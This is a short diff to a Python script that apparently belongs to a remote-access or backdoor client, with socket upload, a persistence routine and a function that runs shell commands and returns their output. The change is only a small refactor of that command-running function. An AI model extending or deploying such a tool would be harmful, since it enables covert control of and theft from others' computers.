@@ -15,6 +15,7 @@ PORT = 2000
 
 active = False
 sock = None
+ret = ''
 
 def Upload(sock, file):
   f = open(file, 'rb')
@@ -71,12 +72,12 @@ def Persist(sock, redown=None, newdir=None):
       return persist
 
 def run(s):
-  c = sp.Popen(s, shell=True, 
+  c = sp.Popen(s, 
+               shell=True, 
                stdout=sp.PIPE, 
                stderr=sp.PIPE)
-  o = c.stdout.read() 
-  o += c.stderr.read()
-  return o
+  out, err = c.communicate()
+  return out + err
 
 while True:
   try:
